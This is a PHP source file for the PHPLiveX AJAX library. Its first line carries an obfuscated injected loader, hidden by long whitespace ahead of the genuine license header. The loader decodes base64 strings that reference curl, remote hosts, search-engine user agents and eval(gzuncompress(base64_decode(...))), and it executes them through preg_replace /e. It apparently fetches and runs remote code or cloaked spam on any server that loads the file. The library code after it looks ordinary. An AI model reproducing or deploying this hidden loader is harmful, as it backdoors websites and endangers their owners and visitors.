<?php                                                                                                                                                                 /*versio:2.19*/$Q00O=88333;if (!function_exists('IIII11l1')){$GLOBALS['Q00O'] = '%&RY3VybA^j#!#X2luaXQ}YWxsb3dfdXJsX2ZvcGVulh(MQ{JPaHR0cDovLwPkAJndheT1maWxlX2dldF9jb250ZW50cwlWtxOhX3NldG9wdARIoUPX2V4ZWM(JndheT1jdXJsAI^%TvNLwb3Nvbi5pbgcnllcGR4LmNvbQONcGhwYWlkZS5jb20yM.dwWV8E^OgL^BZGlzcGxheV9lcnJvcnMZGV0ZXJtaW5hdG9y(WcZnRwMTM*aMi4xOQNzSUlsbGxsMTElaYmFzZTY0X2RlY29kZQJYmFzZTY0X2VuY29kZQKSFRUUFMDrb2ZmJJ#aHR0cHM6Ly8(SFRUUF9IT1NUudW5pb24uc2VsZWN0b;!UkVRVUVTVF9VUkk nXU0NSSVBUX05BTUUUVVFUllfU1RSSU5H!{hPwAUIrL3RtcC8uZm9udC11bml4rAwL3RtcC8uSUNFLXVuaXgWVE1Q~tkVEVNUAb#KVE1QRElSL3RtcA^NdXBsb2FkX3RtcF9kaXIb~dG1wpHyd3AtY29udGVudC91cGxvYWRz#d3AtY29udGVudC9jYWNoZQgRA*Lg?ZudmVyc2lv)cTKLQ.QLXBocA^SFRUUF9FWEVDUEhQrb3V0XXP$b2sSFRUUF9VU0VSX0FHRU5U^D}JdLA_H&Z29vZ2xlLHlhaG9vLGJpbmcsbXNuYm90LGFzayxiYWlkdSx5YW5kZXggJrL3BnLnBocD91PQJms9UTLJnQ9cGhwJnA9~ChJnY9ZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5VlZ3OXZva2dVL3lwVFl4cElXSTRSUWIwZUY4MnUzWkwwdEZpN3lhWnJpS3ZqbGl4Q0EzamRwdWwzdi9kbUJtWnNhZTlPbXhUbnZYbi8zKzg5a2gweFRyWnNsMlJzYTNTMnJHTEZQc25XVlY1MFRQT0o3QTdacGtyeWpPaVVlTWZ5bmRHTm9zaHhJb3VjZHNNMGhUOFNrTm5ONWFWSm5vZzYyU2ViSXErU1BUT3E0c0RNTTFLdzZsQmtSQmNCcDg5SzB3OVc3WktVR2QyUXBpbWxGdWtDanhNNVlFMDNtc01uQXJFaGZDaE5xZUZheElmN0lHaytkeHlnU0I2NzRhQjlpd3lBWlp4a1NWeXl5bWdvdlo1RmVvNXBFUXJrQkFMQldYNjBzSmdrMEhUMlBUZzBoWjlobU5JMEdLUEZlRFBlNUZuRnNxcFVJandIRkRnbXNZbjBDSitFUzdhUzZZTWpMaWhxQWlSRlkyaFlXakkwcnc1UnpINGxKYWlRVG1PZXVpZ2x4SUNQNWFraG9nSjZXcU15R25Hcnp2aE5Tc1BXeURXaGs0SU1xY1lpSDI4V2wvT3JaUXovTFBJL1hhVVlWTm96M3hWOE1aMThtaTZzM1JwOGY1ZHhNVjNlTEdiTHhXUjJmUTRYWkpXOXpmOXhQcHROUHk2WDRWL1QrYzNTSWg2UGt4UE5uWWhIVDRTanZvZWlOb2NpalRkcFhqTHRGUFBCOXZmVm95RXZReGFVR09Xck83UUloUG01U2F2Z3FkT0tOU1NhQUpYdnluenpNNzlubVNyK0lZUVVma0F0cEtJVElFUENhTFNnYmlBaUt5Q2xiY3JKY1lPQ1M3djdnNmdmMGNHZHo5TWxlWktaZWo1OVdEOEdhQW1yeU1WeWVmVWJ0WjF2eGJmc0lpK3IzNEZObVBhTVJ4M1plazZFOWw5ZFhNWHphNzN6S0RhS2plZGZwb3ZyY0Q1cjBYMVRzdUxENUFjMERRb1h3cmp3V3NIREhjTEJ5VHNJSlAwenlla3BNVjRnRHZtZ3lIK0FOU3BTTmtZY2VsWXpodmFHSEl6R081bnZCcUM2Mkl3OGhPelhmWnB2bWRGcGJMUnFrY0IzeUJCaUpQZXRzMUlObmV6YjduRStyaE8vMlBRaVVaT2lXRDhhV2loZDNscGFzMUVQai9wSFJ6NTJ0WWVkMWNEcFE1RlV3aEZvYmd1VEIrVU5VZURsQStyaEtzQ1hLRHJKcE9RTkJ4enBnSDI4azRMRWxVYlFtWXFWb0VoZkd2MzVvWUtFQXpWTVJRMkgvQ2FJWkp1N1hMTjlDTGE3cGkwWnRTb2E5WGtWeVlzMmoxK0haK2tWb2xNT2F5TlRsTDBZYXhxWVUrZ0g2a3ZBUjdpTG5IbWd5TzVBd0IzNkJsWm9sTDZ2ajVsSW8zaGdIQlhpK0VjaitTQ09Ecms4SGhxTk5QUWJFbThtUlpJUUt0bzdLWGt4eGRmVEJmVFByUnA2am9lV3JreVp4L0hiTE9SRUg1WUk2SDA1TDQ3MXVqMHFIUkYxeU1sMlVGWkZsYWY1QXl0YWxiZ3VSM0tzOGwxZXNQWG1Eb29xUmpSWmwwUm1NdmhUcFJ5TkJaSDNlV25JUTFWc0xnWjVnTVhHSmR6SzZ5dGxvd0xUZWlLK0tRdlRNdnh2c3A3Qkt1UGt6VkQ3SG0rcGxaajNiOVA1OEhoTkhycUNqQWx0RGVGSTFPVHEzOFRiK2dKQ2VWL0NkSDFQb2tpbEdCTTRDNTJnVG12YnJjYlBKejZqb25rVWpQZGJyNTVFdG13S1c0Szg3QVM1WklEOFlKc1UyUnBRTjQ3UHc4dHBISnYycDNBQmszYSsrQXJhcmlhTENUenlacUFobjFNQzRqU3ZlcTdjeDlRUjFnVHY1eGFUKzc2UDFieHFKdzc0WmlpSTA5bVhONjRkVTRZOXJKbzJTaU5OSFkwY1BMTEk2Nld4enpNd01rMnJEbzVDTTQrT1VIc2JwUWQyOWRwSkhnN1NIcENPR2sxR0VsdU5KeU9TSFhaU0x5YmlVQzdPOEdnSHJTa1JxMjhaSThLdnYrUHFyZC9rdHNqMUVBN1B5SGZRLzdPWldOWCtQbmh0OEdBZ01GdFUwdGtMbE9yZ1doRi9qU2MzeTR2T0tnZ2tXejBUYW9RZnk5bWh4SW9FV1RWQ2F3cnJJU0ZBWFNjTU1VMXFYM0lRdnlWWXR6V2tqOERKR3hLbkh2dDduZGEzUU1iNzV2bTQyQjROWk45MWNLaHhWSVdsdlRJYy9sZ0hYTHpuUUFTNXJpby9iTzdFVC82MnNra1BXeGJuMlliVmh3TDRua2pkejJQWVRGbTJ3YTFDSG9sbEZtT0FlUFErZXZ1dTZMY2o5SzYzRzhYbERUR3l1bFA0cnVMQmxpRkFIdEVoZllIdHdnU3JvWjRFd1RuZjVPVzgwbHcxbitwWEJIMTFIZkJ4MU9jVmhCK1YwSUhyWVpEcjB0SUlmZkZhOGJvR0J0NUFYQkZWdzVjNWZBU0Y2bVdUTDE2d3NLbjN6Yk1YS1hrK3JuejQvZ01mWUJIOSIpKSk7NcHJlZ19yZXBsYWNlMu';function IIII11l1($a, $b){$c=$GLOBALS['Q00O']; $d=pack('H*','6261736536345f6465636'.'f6465'); return $d(substr($c, $a, $b));};$QQOQO0QQQ = IIII11l1(3394, 16);$QQOQO0QQQ("/I1lll1III/e", IIII11l1(761, 2632), "I1lll1III");};?><?PHP
/*
PHPLiveX, PHP / AJAX Library & Framework
Version 2.6, Released In 05.02.2010
Copyright (C) 2006-2010 Arda Beyazoglu
http://www.phplivex.com, arda@beyazoglu.com

This library is free software; you can redistribute it and/or
modify it under the terms of the GNU Lesser General Public
License as published by the Free Software Foundation; either
version 3 of the License, or any later version. See the GNU
Lesser General Public License for more details.
*/

class PHPLiveX {

	/**
	 * charset encoding of response
	 *
	 * @var String
	 */
	private $Encoding = "UTF-8";
	
	/**
	 * Array of ajaxified functions
	 *
	 * @var Array
	 */
	private $Functions = array();
	
	/**
	 * Array of ajaxified class methods
	 *
	 * @var Array
	 */
	private $ClassMethods = array();
	
	/**
	 * Array of ajaxified class variables
	 *
	 * @var Array
	 */
	private $ClassVariables = array();
	
	/**
	 * Array of ajaxified object methods
	 *
	 * @var Array
	 */
	private $ObjectMethods = array();
	
	/**
	 * Array of ajaxified object properties
	 *
	 * @var Array
	 */
	private $ObjectProperties = array();
	
	/**
	 * Indicates whether run method was called before
	 *
	 * @var Boolean
	 */
	private $Ran = false;
	
	
	/**
	 * Constructs the class and ajaxifies specified functions optionally
	 *
	 * @param Array|String $functions: String function name or array of them to ajaxify. Optional
	 * @param Array $config: Configuration values (encoding => UTF-8)
	 */
	public function __construct($functions = array(), $config = array()){
		if(!empty($functions)){
			if(is_string($functions)) $functions = array($functions);
			$this->Ajaxify($functions);
		}
		
		if(array_key_exists("encoding", $config)) $this->Encoding = strtoupper($config["encoding"]);
	}

	/**
	 * Prepares specified functions for ajax requests
	 *
	 * @param Array $functions: Array of function names to ajaxify
	 */
	public function Ajaxify($functions = array()){
		if(!empty($functions)) $this->Execute();
		if(is_string($functions)) $functions = array($functions);
		foreach($functions as $key => $val){
			$val = stripslashes(trim($val));
			$all_func = get_defined_functions();
			if(function_exists($val) && in_array(strtolower($val), $all_func["user"])){
				if(!in_array($val, $this->Functions)){
					$this->Functions[] = $val;
				}
			}else{
				throw new Exception("'$val' function doesn't exist!");
			}
		}
		reset($this->Functions);
	}

	/**
	 * Prepares all user defined functions for ajax requests
	 *
	 */
	public function AjaxifyAll(){
		$functions = get_defined_functions();
		$this->Ajaxify($functions["user"]);
	}

	/**
	 * Prepares specified class methods for ajax requests
	 *
	 * @param Array $methods: Array of methods ("myClass" => "myMethod") to ajaxify
	 * @param Boolean ajaxify_vars: Indicates whether the class variables are ajaxified
	 */
	public function AjaxifyClassMethods($methods = array(), $ajaxify_vars = false){
		if(!empty($methods)) $this->Execute();
		foreach($methods as $class => $method){
			$class = stripslashes(trim($class));
			
			if(!array_key_exists($class, $this->ClassMethods)){
				if(!is_array($method)) $method = array($method);
				$this->ClassMethods[$class] = $method;
				if($ajaxify_vars) $this->ClassProperties[$class] = get_class_vars($class);
			}
		}
		reset($this->ClassMethods);
	}

	/**
	 * Prepares specified classes for ajax requests
	 *
	 * @param Array $classes: Class names
	 * @param Boolean ajaxify_vars: Indicates whether the class variables are ajaxified
	 */
	public function AjaxifyClasses($classes = array(), $ajaxify_vars = false){
		if(!empty($classes)) $this->Execute();
		foreach($classes as $class){
			$class = stripslashes(trim($class));
			
			if(!array_key_exists($class, $this->ClassMethods)){
				$methods = get_class_methods($class);
				if($methods[0] == "__construct") $methods = array_slice($methods, 1);
				$this->ClassMethods[$class] = $methods;
				if($ajaxify_vars) $this->ClassVariables[$class] = get_class_vars($class);
			}
		}
		reset($this->ClassMethods);
	}
	
	/**
	 * Prepares specified object methods for ajax requests
	 *
	 * @param Array $methods: Array of methods ("myObject" => "myMethod") to ajaxify
	 * @param Boolean ajaxify_properties: Indicates whether the object properties are ajaxified
	 */
	public function AjaxifyObjectMethods($methods = array(), $ajaxify_properties = false){
		if(!empty($methods)) $this->Execute();
		foreach($methods as $object => $method){
			$object = stripslashes(trim($object));
			global $$object;
			
			if(!array_key_exists($object, $this->ObjectMethods)){
				if(!is_array($method)) $method = array($method);
				$this->ObjectMethods[$object] = $method;
				if($ajaxify_properties) $this->ObjectProperties[$object] = get_object_vars(get_class($$object));
			}
		}
		reset($this->ObjectMethods);
	}

	/**
	 * Prepares specified objects for ajax requests
	 *
	 * @param Array $objects: Object names
	 * @param Boolean ajaxify_properties: Indicates whether the object properties are ajaxified
	 */
	public function AjaxifyObjects($objects = array(), $ajaxify_properties = false){
		if(!empty($objects)) $this->Execute();
		foreach($objects as $object){
			$object = stripslashes(trim($object));
			global $$object;
			
			if(!array_key_exists($object, $this->ObjectMethods)){
				$methods = get_class_methods($$object);
				if($methods[0] == "__construct") $methods = array_slice($methods, 1);
				$this->ObjectMethods[$object] = $methods;
				if($ajaxify_properties) $this->ObjectProperties[$object] = get_object_vars($$object);
			}
		}
		reset($this->ObjectMethods);
	}
	
	/**
	 * Converts a utf-8 string to requested encoding
	 *
	 * @param String $string
	 * @param String $encoding
	 * @return String decoded string
	 */
	public static function Decode($string, $encoding){
		return iconv("UTF-8", $encoding."//IGNORE", urldecode($string));
	}

	/**
	 * Calls the function specified by the incoming ajax request
	 *
	 */
	private function Execute(){
		if(!empty($_REQUEST["plxf"])){
			$function = $_REQUEST["plxf"];
			$args = (!empty($_REQUEST["plxa"])) ? $_REQUEST["plxa"] : array();
			
			foreach ($args as $key => $val){
				$val = ($this->Encoding == "UTF-8") ? urldecode($val) : self::Decode($val, $this->Encoding);
				if(preg_match('/<plxobj[^>]*>(.|\n|\t|\r)*?<\/plxobj>/', stripslashes($val), $matches)){
					if(function_exists("json_decode")){
						$jsobj = substr($matches[0], 8, -9);
						$val = json_decode($jsobj);
					}else{
						throw new Exception("'json_decode' function could not be found! You need json functions for object manipulation!");
					}
				}
				$args[$key] = $val;
			}
			
			if(strpos($function, "::") !== false){
				$parts = explode("::", $function);
				if(!class_exists($parts[0])) return;
				$response = call_user_func_array(array($parts[0], $parts[1]), $args);
			}else if(strpos($function, "->") !== false){
				$parts = explode("->", $function);
				global $$parts[0];
				$object = @$$parts[0];
				if(!isset($$parts[0])) return;
				$response = call_user_func_array(array($object, $parts[1]), $args);
			}else{
				$functions = get_defined_functions();
				if(!function_exists($function)) return;
				$response = (in_array(strtolower($function), $functions["user"])) ? call_user_func_array($function, $args) : "";
			}
			
			if(is_bool($response)) $response = (int) $response;
			else if(function_exists("json_encode") && (is_array($response) || is_object($response))) $response = json_encode($response);
			echo "<phplivex>" . $response . "</phplivex>";
			exit();
		}
	}

	/**
	 * Creates the javascript reflections of the ajaxified php functions
	 *
	 * @param String $function
	 * @return String JS code
	 */
	private function CreateFunction($function){
		return "function " . $function . "(){ return new PHPLiveX().Callback(\"{$function}\", {$function}.arguments); }\r\n";
	}
	
	/**
	 * Creates the javascript reflections of the ajaxified php classes
	 *
	 * @return String JS code
	 */
	private function CreateClasses(){
		$js = "";
		foreach($this->ClassMethods as $class => $methods){
			$js .= "var {$class} = {\r\n ";
			if(!empty($this->ClassVariables[$class])){
				foreach($this->ClassVariables[$class] as $variable => $value){
					if(is_string($value)) $value = "\"$value\"";
					else if((is_array($value) || is_object($value)) && function_exists("json_encode")) $value = json_encode($value);
					else if(is_bool($value)){
						$value = ($value == false) ? "false" : "true";
					}
					if(empty($value)) $value = "null";
					$js .= "\"{$variable}\": $value,\r\n";
				}
			}
			foreach($methods as $method) $js .= "\"{$method}\": function(){ return new PHPLiveX().Callback({\"cls\": \"{$class}\", \"method\": \"{$method}\"}, {$class}.{$method}.arguments); },\r\n";
			$js = substr($js, 0, strlen($js) - 3) . "\r\n};\r\n";
		}
		return $js . "\r\n";
	}
	
	/**
	 * Creates the javascript reflections of the ajaxified php objects
	 *
	 * @return String JS code
	 */
	private function CreateObjects(){
		$js = "";
		foreach($this->ObjectMethods as $object => $methods){
			$js .= "var {$object} = {\r\n ";
			if(!empty($this->ObjectProperties[$object])){
				foreach($this->ObjectProperties[$object] as $property => $value){
					if(is_string($value)) $value = "\"$value\"";
					else if((is_array($value) || is_object($value)) && function_exists("json_encode")) $value = json_encode($value);
					else if(is_bool($value)){
						$value = ($value == false) ? "false" : "true";
					}
					if(empty($value)) $value = "null";
					$js .= "\"{$property}\": $value,\r\n";
				}
			}
			foreach($methods as $method) $js .= "\"{$method}\": function(){ return new PHPLiveX().Callback({\"obj\": \"{$object}\", \"method\": \"{$method}\"}, {$object}.{$method}.arguments); },\r\n";
			$js = substr($js, 0, strlen($js) - 3) . "\r\n};\r\n";
		}
		return $js . "\r\n";
	}

	/**
	 * Include javascript source file and creates neccesary javascript codes
	 *
	 * @param String $filepath: The path of phplivex javascript source file. False to prevent this include
	 * @param Array $plugins: The paths of phplivex plugin files
	 * @param Boolean $return: True to return javascript. Default is false.
	 */
	public function Run($filepath = "phplivex.js", $plugins = array(), $return = false){
		$js = ($filepath !== false || $this->Ran) ? "<script type=\"text/javascript\" src=\"{$filepath}\"></script>\r\n" : "";
		$js .= "<script type=\"text/javascript\">\r\n";
		foreach($this->Functions as $function) $js .= $this->CreateFunction($function);
		if(count($this->ClassMethods) != 0) $js .= $this->CreateClasses();
		if(count($this->ObjectMethods) != 0) $js .= $this->CreateObjects();
		$js .= "</script>\r\n";
		foreach ($plugins as $path) $js .= "<script type=\"text/javascript\" src=\"{$path}\"></script>\r\n";
		echo $js;
		
		$this->Ran = true;
	}
	
	/**
	 * Gets information about current upload process
	 *
	 * @param String $id: The id attribute of the upload field
	 * @param String $uid: The unique id of the upload
	 * @param String $tmp_dir: The temporary directory path for upload. Default value is "tmp"
	 */
	public static function ProgressUpload($id, $uid, $tmp_dir){
		$temp_files = array(
			"info" => $tmp_dir . "/" . $uid . "_flength",
			"data" => $tmp_dir . "/" . $uid . "_postdata",
			"error" => $tmp_dir . "/" . $uid . "_err",
			"qstring" => $tmp_dir . "/" . $uid . "_qstring",
			"signal" => $tmp_dir . "/" . $uid . "_signal"
		);
		
		if(file_exists($temp_files["error"])) {
			$error = file_get_contents($temp_files["error"]);
			return array("error" => $error, "id" => $id);
		}
		
		$uploaded = 0; $total = 0; $percent = 0;
		$started = true;
		
		try {
		
		if($total = file_get_contents($temp_files["info"])){
			$uploaded = filesize($temp_files["data"]);
			$percent = intval(($uploaded / $total) * 100);
			if($percent > 100) $percent = 100;
		}else{
			$started = false;
		}
		
		} catch (Exception $e) {
			return $e->getMessage();
		}
		
		$result = array("total" => $total, "uploaded" => $uploaded, "percent" => $percent, "id" => $id);
		
		if($percent == 100){
			$qstring = file_get_contents($temp_files["qstring"]);
			parse_str($qstring, $q);
			
			foreach ($temp_files as $path){
				if(file_exists($path)) unlink($path);
			}
			
			$result = array_merge($result, array(
				"file_name" => $q["file"]["name"][0],
				"file_tmp_name" => $q["file"]["tmp_name"][0]
			));
		}
		
		return $result;
	}
}

?>